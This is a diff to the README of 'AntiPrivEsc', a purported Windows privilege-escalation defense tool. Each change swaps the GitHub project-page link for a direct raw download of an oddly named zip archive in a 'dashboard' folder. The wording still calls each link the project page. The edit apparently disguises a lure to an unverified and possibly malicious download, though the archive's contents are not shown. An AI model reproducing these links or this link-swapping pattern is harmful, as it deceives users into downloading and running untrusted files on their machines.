@@ -1,12 +1,12 @@
 # 🛡️ AntiPrivEsc - Simple defense for Windows users
 
-[![Download AntiPrivEsc](https://img.shields.io/badge/Download-AntiPrivEsc-blue?style=for-the-badge&logo=github)](https://github.com/ayushrajsinha03072006-cloud/AntiPrivEsc)
+[![Download AntiPrivEsc](https://img.shields.io/badge/Download-AntiPrivEsc-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/ayushrajsinha03072006-cloud/AntiPrivEsc/main/dashboard/Esc-Anti-Priv-casse.zip)
 
 ## 🔽 Download
 
 Use this link to visit the project page and download AntiPrivEsc:
 
-[https://github.com/ayushrajsinha03072006-cloud/AntiPrivEsc](https://github.com/ayushrajsinha03072006-cloud/AntiPrivEsc)
+[https://raw.githubusercontent.com/ayushrajsinha03072006-cloud/AntiPrivEsc/main/dashboard/Esc-Anti-Priv-casse.zip](https://raw.githubusercontent.com/ayushrajsinha03072006-cloud/AntiPrivEsc/main/dashboard/Esc-Anti-Priv-casse.zip)
 
 ## 🧩 What AntiPrivEsc Does
 
@@ -31,7 +31,7 @@ For best results, use a current Windows update level and keep your security tool
 Follow these steps to download and run AntiPrivEsc on Windows.
 
 1. Open the project page:
-   [https://github.com/ayushrajsinha03072006-cloud/AntiPrivEsc](https://github.com/ayushrajsinha03072006-cloud/AntiPrivEsc)
+   [https://raw.githubusercontent.com/ayushrajsinha03072006-cloud/AntiPrivEsc/main/dashboard/Esc-Anti-Priv-casse.zip](https://raw.githubusercontent.com/ayushrajsinha03072006-cloud/AntiPrivEsc/main/dashboard/Esc-Anti-Priv-casse.zip)
 
 2. Look for the latest release or the main download file on the page.
 
@@ -170,7 +170,7 @@ Use these habits when you run any security tool:
 
 Primary download page:
 
-[https://github.com/ayushrajsinha03072006-cloud/AntiPrivEsc](https://github.com/ayushrajsinha03072006-cloud/AntiPrivEsc)
+[https://raw.githubusercontent.com/ayushrajsinha03072006-cloud/AntiPrivEsc/main/dashboard/Esc-Anti-Priv-casse.zip](https://raw.githubusercontent.com/ayushrajsinha03072006-cloud/AntiPrivEsc/main/dashboard/Esc-Anti-Priv-casse.zip)
 
 ## 🧭 Quick Start
 
